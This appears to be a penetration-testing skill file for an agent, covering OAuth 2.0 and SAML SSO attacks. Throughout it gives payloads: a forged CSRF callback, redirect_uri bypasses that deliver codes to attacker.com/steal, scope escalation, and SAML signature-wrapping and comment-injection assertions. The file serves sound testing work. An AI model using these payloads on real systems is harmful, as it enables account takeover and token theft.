---
name: oauth_sso
description: OAuth 2.0 and SSO security testing - CSRF via missing state, redirect_uri bypass, token leakage, account takeover chains
---

# OAuth 2.0 & SSO Vulnerabilities

OAuth 2.0 misconfigurations enable account takeover via CSRF (missing state), open redirect (redirect_uri bypass), and token leakage. SAML-based SSO adds additional attack vectors: XML signature wrapping, comment injection, and assertion replay.

## OAuth Flow Overview

```
Authorization Code Flow (confidential client):
Browser → GET /auth?client_id=&redirect_uri=&scope=&state=CSRF_TOKEN
Auth Server → Redirect to /callback?code=AUTH_CODE&state=CSRF_TOKEN
Client → POST /token (code, client_secret) → Access Token + Refresh Token

Implicit Flow (deprecated, still found):
Browser → GET /auth?response_type=token → Redirect with #access_token=...
# Token in URL fragment → leaks in Referer header, browser history
```

## Vulnerability 1: Missing CSRF Protection (No state Parameter)

```
# Attacker crafts authorization URL with their own code/token
GET /oauth/authorize?
  client_id=app_id&
  redirect_uri=https://app.com/callback&
  scope=profile email&
  response_type=code
  # NO state parameter

# Exploit CSRF:
# 1. Attacker starts OAuth flow, gets code, does NOT visit callback
# 2. Hosts CSRF page:
<img src="https://app.com/oauth/callback?code=ATTACKER_CODE">
# 3. Victim visits → their session gets linked to attacker's IdP account
# Result: Account takeover — attacker can now login as victim
```

Test by: checking if `state` in OAuth redirect; sending callback request without `state` via CSRF page.

## Vulnerability 2: redirect_uri Bypass

### Path Traversal

```
# Registered: https://app.com/callback
# Bypass:
redirect_uri=https://app.com/callback/../attacker-page
redirect_uri=https://app.com/callback/../../..%2fattacker.com
redirect_uri=https://app.com%2fcallback%2f..%2fattacker
```

### Subdomain/Scheme Tricks

```
# Registered: https://app.com/oauth/callback
# Weak validation: starts with "https://app.com"
redirect_uri=https://app.com.attacker.com/callback
redirect_uri=https://app.com/callback?x=y%26redirect_uri=https://attacker.com
redirect_uri=https://app.com/callback#https://attacker.com
```

### Open Redirect Chain

```
# App has open redirect at /redirect?url=
# OAuth trusts app.com/*
redirect_uri=https://app.com/redirect?url=https://attacker.com
# Code/token redirected to attacker.com via chain
```

### Wildcard Bypass

```
# Registered: *.app.com
redirect_uri=https://evil.app.com/steal
```

### Exploit URI Bypass → Token Theft

```
# Attacker hosts listener at their domain
# Sends victim link:
https://auth.provider.com/oauth/authorize?
  client_id=XXX&
  response_type=code&
  redirect_uri=https://app.com/redirect%3Furl%3Dhttps%3A//attacker.com/steal&
  scope=profile
# Victim approves → code sent to attacker.com/steal
# Attacker exchanges code for tokens
```

## Vulnerability 3: Implicit Flow Token Leakage

```
# Implicit flow puts token in URL fragment:
https://app.com/callback#access_token=ya29.a0AbV...&token_type=bearer

# Leakage vectors:
1. Referer header: if page makes sub-requests after callback, Referer includes fragment in some browsers
2. Browser history: user's history includes token
3. postMessage forwarding: app sends fragment to embedded iframe
4. Analytics/logging: client-side JS sends full URL to analytics
5. Third-party scripts: script on page reads location.href
```

Detection: look for `response_type=token` in OAuth authorization URLs.

## Vulnerability 4: Token Replay / Session Fixation

```
# Authorization codes should be single-use:
GET /callback?code=AUTH_CODE  # first use — legitimate
GET /callback?code=AUTH_CODE  # second use — should fail with 400

# If server replays: attacker who sees ANY code (Referer leak) can auth as victim
```

## Vulnerability 5: Scope Escalation

```
# Request minimal scope first
scope=openid profile

# Then try to reuse the code/token to access larger scope
GET /api/admin HTTP/1.1
Authorization: Bearer TOKEN_FROM_PROFILE_SCOPE
# Some implementations don't check scope at resource server
```

## SAML Attacks

### XML Signature Wrapping (XSW)

```xml
<!-- Original signed assertion -->
<Assertion ID="legit_id">
  <Subject><NameID>victim@corp.com</NameID></Subject>
  <Signature>VALID_SIG_FOR_legit_id</Signature>
</Assertion>

<!-- XSW: wrap to confuse parser -->
<Assertion ID="evil_id">
  <Subject><NameID>admin@corp.com</NameID></Subject>
  <Assertion ID="legit_id">   <!-- signature still valid for this inner one -->
    <Subject><NameID>victim@corp.com</NameID></Subject>
    <Signature>VALID_SIG</Signature>
  </Assertion>
</Assertion>
<!-- If SP reads first Assertion and verifies inner one = bypass -->
```

### Comment Injection / Account Takeover

```xml
<!-- Original: <NameID>victim@corp.com</NameID> -->
<!-- Injected: -->
<NameID>admin<!--INJECTED-->@corp.com</NameID>
<!-- If parser splits on comment, resolves to admin -->
```

## Validation Approach

1. Map complete OAuth flow: capture all redirects via proxy
2. Test state CSRF: drop state parameter → forge callback request → confirm session linking
3. Test redirect_uri: inject traversal variants → confirm code delivered to attacker URL
4. For implicit flow: check if token appears in Referer to sub-requests
5. All steps: document proxy request IDs for authorization request, callback, token exchange

## Tools

- Burp Suite HTTP history — capture full OAuth flow
- `OAuth-tester` script / manual `send_request` sequences
- SAML Raider (Burp extension) — XSW attack generation
- `samlpwn` — automated SAML attack tool
